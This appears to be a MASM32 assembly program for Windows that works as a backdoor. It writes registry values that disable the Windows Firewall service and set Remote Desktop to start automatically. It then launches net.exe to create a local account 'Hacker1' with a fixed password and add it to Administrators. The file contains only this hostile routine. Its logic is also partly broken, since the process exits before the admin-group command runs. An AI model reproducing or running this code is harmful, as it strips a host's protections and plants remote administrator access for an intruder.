.386
.model flat, stdcall
option casemap :none   ; case sensitive

    include c:\masm32\include\windows.inc
    include c:\masm32\include\user32.inc
    include c:\masm32\include\kernel32.inc
    include c:\masm32\include\advapi32.inc
    includelib c:\masm32\lib\user32.lib
    includelib c:\masm32\lib\kernel32.lib
    includelib c:\masm32\lib\advapi32.lib
	include c:\masm32\macros\macros.asm
	
.data
    SubKey     db "SYSTEM\CurrentControlSet\services\MpsSvc",0
    szValue db "Start",0
    szCaption  db "Read Compare",0
    szRan      dd 4,0

    SubKey1     db "SYSTEM\CurrentControlSet\services\TermService",0
    szValue1 db "Start",0
    szCaption1  db "Read Compare",0
    szRan1      dd 2,0
	
	File db "calc.exe",0
	Info STARTUPINFO <>
	Path 		db "c:\windows\system32\",0
	
	buff dd 0 ;
programname db "c:\windows\system32\net.exe",0
params1 db "net user Hacker1 P@ssw0rd /add",0
params2 db "net localgroup Administrators Hacker1 /add",0

;programname db "1-1.exe",0
titl db 'Level 0',0
frmt db 'My ProcID = %i (decimal)',0
startInfo dd ?
processInfo PROCESS_INFORMATION <> ;
	
.data?
    hKey       dd ?
    hValue     dd ?
    szBuffer   db 4 dup (?)
	
	

.code

start:
    invoke RegOpenKeyEx,HKEY_LOCAL_MACHINE,ADDR SubKey,NULL,KEY_QUERY_VALUE,ADDR hKey     ;open our key
        .if !eax                                                                          ;if it is there we more then likley wrote it
                invoke RegCreateKey,HKEY_LOCAL_MACHINE, ADDR SubKey,ADDR hKey               ;create the key
                    .if !eax                                                                ;make sure it does not fail
                        invoke RegSetValueEx,hKey,ADDR szValue,0,REG_DWORD,ADDR szRan,4     ;set the szRan string in the registry
                    .endif
        .endif
				
    invoke RegCloseKey , hKey                               ;close the registry key
	
    invoke RegOpenKeyEx,HKEY_LOCAL_MACHINE,ADDR SubKey1,NULL,KEY_QUERY_VALUE,ADDR hKey     ;open our key
        .if !eax                                                                          ;if it is there we more then likley wrote it
                invoke RegCreateKey,HKEY_LOCAL_MACHINE, ADDR SubKey1,ADDR hKey               ;create the key
                    .if !eax                                                                ;make sure it does not fail
                        invoke RegSetValueEx,hKey,ADDR szValue1,0,REG_DWORD,ADDR szRan1,4     ;set the szRan string in the registry
                    .endif
        .endif
				
    invoke RegCloseKey , hKey                               ;close the registry key	
	
invoke CreateProcess,ADDR programname,ADDR params1,0,0,FALSE,\
NORMAL_PRIORITY_CLASS, 0,0,ADDR startInfo,ADDR processInfo

invoke ExitProcess,NULL

invoke CreateProcess,ADDR programname,ADDR params2,0,0,FALSE,\
NORMAL_PRIORITY_CLASS, 0,0,ADDR startInfo,ADDR processInfo
	
        invoke ExitProcess,NULL
            ret
end start
